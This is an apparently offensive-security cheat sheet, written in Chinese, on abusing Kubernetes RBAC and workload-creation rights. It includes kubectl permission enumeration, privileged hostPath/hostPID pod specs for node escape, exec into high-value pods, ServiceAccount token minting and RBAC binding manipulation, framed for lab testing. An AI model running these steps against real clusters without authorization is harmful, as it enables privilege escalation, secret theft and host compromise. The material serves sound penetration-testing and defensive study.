# Kubernetes RBAC / Workload Creation Abuse

## 1. 先枚举真正权限

```bash
kubectl auth can-i --list
kubectl auth can-i get secrets -A
kubectl auth can-i create pods -n <NS>
kubectl auth can-i create deployments.apps -n <NS>
kubectl auth can-i create daemonsets.apps -n <NS>
kubectl auth can-i create rolebindings.rbac.authorization.k8s.io -n <NS>
kubectl auth can-i create clusterrolebindings.rbac.authorization.k8s.io
kubectl auth can-i create serviceaccounts/token -n <NS>
```

## 2. 高价值原语

| 权限 | 影响 |
|---|---|
| pods/exec | 进入已有高价值 Pod |
| pods/create | 创建受控 Pod，受 Pod Security/Admission 限制 |
| deployments/jobs/daemonsets create | 可间接创建 Pod，即使没有 pods/create |
| secrets get/list | 凭据/配置 |
| serviceaccounts/token create | 请求短期 SA token |
| rolebindings/clusterrolebindings write | 把已有高权 role 绑定到受控 identity |
| roles/clusterroles write | 创建/修改权限集合 |
| nodes/proxy | 通过 API Server 代理访问 kubelet 等节点接口 |
| mutatingwebhookconfigurations write | admission control / persistence |

## 3. Controller → Pod

badPods 的重要思路：攻击者不一定需要直接 `pods/create`。

```bash
for r in deployments.apps daemonsets.apps statefulsets.apps jobs.batch cronjobs.batch; do
  kubectl auth can-i create "$r" -n <NS>
done
```

如果任一允许，检查能否创建带危险 `securityContext` / `hostPath` / host namespace 的工作负载。

## 4. badPods 条件

```text
RBAC 能创建 Pod 或可创建 Pod 的 controller
+
Pod Security Admission / webhook / policy engine 允许危险 spec
+
目标节点可调度
```

常见风险：

```yaml
securityContext:
  privileged: true

hostPID: true
hostNetwork: true
hostIPC: true

volumes:
- name: host
  hostPath:
    path: /
```

不要直接套全部条件；优先使用当前权限下最小配置验证。

## 5. pods/exec

```bash
kubectl get pods -A -o wide
kubectl auth can-i create pods/exec -n <NS>
kubectl exec -it -n <NS> <POD> -- /bin/sh
```

高价值 Pod：CI runner、operator/controller、cloud-agent、backup、database/admin、带 hostPath/privileged 的 DaemonSet。

## 6. ServiceAccount token

现代方式：

```bash
kubectl create token <SA> -n <NS> --duration=10m
```

TokenRequest 是短期 token。只有明确发现 legacy `kubernetes.io/service-account-token` Secret 时，才按长期 token 处理。

## 7. RBAC binding manipulation

如果有 binding 写权限：

```bash
kubectl get clusterrolebindings -o yaml > crb-before.yaml
kubectl get rolebindings -A -o yaml > rb-before.yaml
```

在靶场创建最小验证 binding，并记录名字；结束删除。完整 persistence 见 `k8s-persistence.md`。

## 8. Admission / Pod Security

即使 RBAC 允许创建 Pod，也可能被：

```text
Pod Security Admission
Kyverno
OPA Gatekeeper
ValidatingWebhook
MutatingWebhook
custom admission policy
```

阻止/修改。失败时读 API 错误原因，不要无限变形 payload。

## 9. Source

- badPods: https://github.com/BishopFox/badPods
- Kubernetes RBAC: https://kubernetes.io/docs/reference/access-authn-authz/rbac/
